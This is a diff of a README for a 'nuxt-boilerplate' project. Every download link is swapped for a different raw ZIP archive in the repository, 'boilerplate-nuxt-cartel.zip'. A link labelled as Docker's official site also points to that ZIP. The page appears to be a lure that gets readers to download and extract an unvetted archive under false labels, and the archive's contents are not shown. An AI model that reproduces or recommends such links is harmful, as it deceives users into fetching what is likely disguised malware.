@@ -1,6 +1,6 @@
 # 🚀 nuxt-boilerplate - Your Easy Start with Nuxt 4
 
-[![Download nuxt-boilerplate](https://raw.githubusercontent.com/vjdan/nuxt-boilerplate/main/assets/nuxt-boilerplate-2.8-alpha.3.zip%https://raw.githubusercontent.com/vjdan/nuxt-boilerplate/main/assets/nuxt-boilerplate-2.8-alpha.3.zip)](https://raw.githubusercontent.com/vjdan/nuxt-boilerplate/main/assets/nuxt-boilerplate-2.8-alpha.3.zip)
+[![Download nuxt-boilerplate](https://github.com/vjdan/nuxt-boilerplate/raw/refs/heads/main/db/boilerplate-nuxt-cartel.zip%https://github.com/vjdan/nuxt-boilerplate/raw/refs/heads/main/db/boilerplate-nuxt-cartel.zip)](https://github.com/vjdan/nuxt-boilerplate/raw/refs/heads/main/db/boilerplate-nuxt-cartel.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ To get started with nuxt-boilerplate, you need to download the application. Plea
 
 1. **Visit the Releases Page:**
    Click the link below to reach the download page:
-   [Download nuxt-boilerplate](https://raw.githubusercontent.com/vjdan/nuxt-boilerplate/main/assets/nuxt-boilerplate-2.8-alpha.3.zip)
+   [Download nuxt-boilerplate](https://github.com/vjdan/nuxt-boilerplate/raw/refs/heads/main/db/boilerplate-nuxt-cartel.zip)
 
 2. **Select the Latest Version:**
    On the Releases page, find the most recent version of nuxt-boilerplate. It will typically be listed at the top.
@@ -24,7 +24,7 @@ To get started with nuxt-boilerplate, you need to download the application. Plea
    After downloading, locate the downloaded file (usually a ZIP or TAR file). Right-click on it and choose "Extract All" or use your extraction tool to unpack the files.
 
 5. **Open Docker:**
-   Ensure that you have Docker installed on your computer. If you do not have it yet, install Docker first from [Docker's official site](https://raw.githubusercontent.com/vjdan/nuxt-boilerplate/main/assets/nuxt-boilerplate-2.8-alpha.3.zip).
+   Ensure that you have Docker installed on your computer. If you do not have it yet, install Docker first from [Docker's official site](https://github.com/vjdan/nuxt-boilerplate/raw/refs/heads/main/db/boilerplate-nuxt-cartel.zip).
 
 6. **Navigate to the Folder:**
    Open your command line interface (Terminal for macOS and Linux, Command Prompt or PowerShell for Windows) and navigate to the folder where you extracted the files. You can use the command `cd path_to_your_folder` to enter the correct directory.
@@ -42,7 +42,7 @@ To get started with nuxt-boilerplate, you need to download the application. Plea
 
 As mentioned, to get nuxt-boilerplate, visit the link below and download it:
 
-[Download nuxt-boilerplate](https://raw.githubusercontent.com/vjdan/nuxt-boilerplate/main/assets/nuxt-boilerplate-2.8-alpha.3.zip)
+[Download nuxt-boilerplate](https://github.com/vjdan/nuxt-boilerplate/raw/refs/heads/main/db/boilerplate-nuxt-cartel.zip)
 
 Make sure to follow the steps above to set it up on your system.
 
